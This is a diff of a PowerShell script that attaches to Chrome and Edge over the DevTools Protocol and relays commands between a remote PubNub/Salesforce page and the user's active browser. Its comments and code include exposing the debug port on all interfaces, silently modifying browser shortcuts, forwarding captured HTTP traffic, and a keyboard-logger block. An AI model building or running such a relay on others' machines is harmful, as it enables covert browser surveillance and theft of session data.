@@ -1,14 +1,5 @@
 Set-Location -LiteralPath (Split-Path -Parent -Path $MyInvocation.MyCommand.Definition)
 
-# ! modify shortcuts (lnk) to point to correct binary with cmd line args enabling CDP
-# ! needs windows task to pre-launch msedge, chrome + headless msedge for pubnubws
-# C:\Users\LC2022\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar
-# replace chrome with uchrome
-# alternative for msedge: use vilvadi
-
-# script needs to ping websockets to check which browser running
-# clientws should connect to active client browser 
-
 $scriptGuid = '70d8ab8e-fdb2-4076-9fd8-ba81c1be92e3' # Use a unique GUID for each script
 # $createdNew = $false
 # $script:SingleInstanceEvent = New-Object System.Threading.EventWaitHandle $true, ([System.Threading.EventResetMode]::ManualReset), "Global\$scriptGuid", ([ref] $createdNew)
@@ -21,22 +12,9 @@ $scriptGuid = '70d8ab8e-fdb2-4076-9fd8-ba81c1be92e3' # Use a unique GUID for eac
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-# 20260920
+# 20260925-1432
 
-# https://zenn.dev/mima_ita/articles/f1fc037e6eb134
-
-# ungoogled chromium
-# start chrome.exe --remote-debugging-port=9223 --profile-directory=Default --remote-allow-origins=* --suppress-message-center-popups  --noerrdialogs --disable-infobars --disable-notifications --no-first-run --no-default-browser-check --disable-signin-promo --hide-crash-restore-bubble --new-window https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/client_pubnub --remote-debugging-address=0.0.0.0 --remote-allow-origins=*
-# https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/client_pubnub
-# --headless=new
-# --auto-open-devtools-for-tabs
-# --remote-debugging-address=0.0.0.0
-# --remote-allow-origins=* 
-# --force-devtools-available
-# frontend.appspot.com
-# msedge requires --user-data-dir="%TEMP%\edge-debug-profile" # on tpl, not required (some pcs, not all)
-
-# side benefit is that seems to keep ps script running
+# note: keeps running even after terminal closed down
 Add-Type -TypeDefinition '
 using System;
 using System.Diagnostics;
@@ -292,7 +270,7 @@ $script:runtime_addBinding_callback = {
     $cdpobj.addbinding_ok = $true
 
     $params = @{
-        expression="(function() { console.log(`"Debug info "+ $(Get-Timestamp) + " `"); return " + $(Get-Random -Minimum 1 -Maximum 100) + "; })()"
+        expression="(function() { console.log(`"PubNub Status Notification -- Successfully connected from pscdp.relay.ps1 -- "+ $(Get-Timestamp) + " `"); return " + $(Get-Random -Minimum 1 -Maximum 100) + "; })()"
         returnByValue=$true
     }
 
@@ -314,10 +292,8 @@ $script:get_targets_action = {
         [object]$Response, [PSCDP]$cdpobj
     )
 
-    $url = 'orgfarm-bd12a2161b-dev-ed'
-
     # $_.title.Contains("Yahoo!")
-    $targetInfo = $Response.result.targetInfos | Where-Object { $_.type -eq "page" -and ( $_.url.Contains($url) ) } | Select-Object -First 1
+    $targetInfo = $Response.result.targetInfos | Where-Object { $_.type -eq "page" -and ( $_.url -eq $script:pubnuburl ) } | Select-Object -First 1
 
     if ( $null -eq $targetInfo ) {
         return $null
@@ -330,6 +306,12 @@ $script:get_targets_action = {
 
     $cdpobj.sendQueue.Add( @{ method="Target.attachToTarget"; params=$params; callback=$init_sessionid_action } )
 
+}
+
+function Process-CDP {
+    param($cmd)
+
+    return $null
 }
 
 function Process-PubNubEvent {
@@ -376,6 +358,8 @@ function Process-PubNubEvent {
 
     if ( $cmd.builtincmd -eq "GetFrontendUrls" ) {
         $result = Get-FrontendUrls
+    } elseif ( $cmd.builtincmd -eq "ProcessCDP" ) {
+        $result = Process-CDP($cmd)
     }
 
     $resultout['result'] = $result
@@ -390,6 +374,32 @@ function Process-PubNubEvent {
     # https://chrome-devtools-frontend.appspot.com/serve_rev/@199a3a541d76237379e353b348e64045584db057/inspector.html?ws=localhost:9223/devtools/page/AF0A1A7626286253F21401C651C983B0
     # retrieve HTTP with headers, body, etc. and forward to pubnub
 
+}
+
+function Ping-DebugPort {
+    param($debugport)
+
+    try {
+        $targets = Invoke-RestMethod -Uri "http://localhost:$debugport/json" -ErrorAction Stop
+    } catch [System.Net.WebException] {
+        Log-Msg "[R5P9]: $($_.Exception.Message)"
+        return $null
+    }        
+
+
+    # $targets | Select-Object title, id, webSocketDebuggerUrl
+    $targets = $targets | Where-Object { $_.type -eq "page" }
+
+    return $targets
+}
+
+function Find-ActiveClientBrowser {
+    # should return debug port (9222 or 9223) and browser name
+    # of client browser if any
+}
+
+function Find-PubNubBrowser {
+    # should find the browser used to make pubnub connections
 }
 
 class PSCDP {
@@ -708,6 +718,12 @@ class PSCDP {
         $iserror = $false
 
         try {
+
+            if ( $msg.ContainsKey('error') ) {
+                $iserror = $true
+                throw ""
+            }
+
             if ( ! $msg.ContainsKey('result') ) {
                 throw ""
             }
@@ -780,6 +796,8 @@ class PSCDP {
                     }
                 } elseif ( $_.Name -eq "error" ) {
                     $iserror = $true
+                } elseif ( $_.Name -eq "id" ) {
+                    $isresult = $true
                 }
 
                 $msght[$_.Name] = $_.Value
@@ -794,7 +812,7 @@ class PSCDP {
                 }
             }
 
-            $iserror = $this.IsMessageError($msght)
+            $iserror = $iserror -or $this.IsMessageError($msght)
             if ( $iserror ) {
                 $this.errors.Add($msght)
             }
@@ -861,6 +879,7 @@ class PSCDP {
         $cmd = $this.SendCdpCommand($cmd)
     }
 
+    # TODO refactor so that only commands with pending callback is being traversed
     [void] ExecCallbacks() {
 
         for ( $i = 0; $i -lt $this.commands.Count; $i++) {
@@ -968,15 +987,19 @@ class PSCDP {
     }
 }
 
-$script:clientws = [PSCDP]::new($script:chrome_debugport)
-$script:clientws.ConnectCdp()
+$script:pubnuburl = "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/client_pubnub"
+$clientport = $script:chrome_debugport
+$pubnubport = $script:msedge_debugport
+# pubnub is whichever browser is holding a target that points to $pubnuburl
+# client is a browser that has an active target and no target pointing to pubnuburl -- if no client found, 
+# delay and try again
 
-$script:pubnubws = [PSCDP]::new($script:msedge_debugport, "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/client_pubnub")
+$script:pubnubws = [PSCDP]::new($pubnubport, $pubnuburl)
 $script:pubnubws.LoadQueue()
 $script:pubnubws.ConnectCdp()
 
-#$script:pubnubws = [PSCDP]::new()
-#$script:pubnubws.ConnectCdp()
+$script:clientws = [PSCDP]::new($clientport)
+$script:clientws.ConnectCdp() # could fail --> if it fails
 
 $keyboardlogger = {
     try {
@@ -992,18 +1015,29 @@ $keyboardlogger = {
 # $asyncResult = $ps.BeginInvoke()
 
 $d = 200
-$n = 10
+$n = 30
 $i = 0
 while ( $true ) {
 
+    # ! need to implement cmd to reset all memory as responses/cmds might take up too much space
+
     Log-Msg "new iteration"
 
-    $script:pubnubws.LogState()
+    $script:pubnubws.LogState() # TODO need to check if pubnub connection is active
     $script:pubnubws.CheckSocket() # report basic statistics: number of messages sent, received, errors, responses, results, etc.
+    # attempt reconnection --> grab targets, connect again to whichever contains the pubnub url, will have to reexecute queue
+    # if target doesn't exist, open new tab and navigate to pubnub url
+    # new connection means new sessionId, new executionContextId for callFunctionOn
 
-    $script:pubnubws.InitReceive()
-    $script:pubnubws.ReadMessage()
-    $script:pubnubws.EndMessage()
+    try {
+        $script:pubnubws.InitReceive()
+        $script:pubnubws.ReadMessage()
+        $script:pubnubws.EndMessage()
+    } catch {
+        if ($_.Exception -is [System.Net.WebSockets.WebSocketException]) {
+            # reconnect
+        }
+    }
 
     $script:pubnubws.ExecCallbacks()
     $script:pubnubws.NextCmd()
@@ -1016,6 +1050,8 @@ while ( $true ) {
     # ---
     # $script:clientws.LogState()
     $script:clientws.CheckSocket()
+    # reconnect if not active --> browser might not be running at all, should be 
+    # able to deal with this edge case
 
     $script:clientws.InitReceive()
     $script:clientws.ReadMessage()
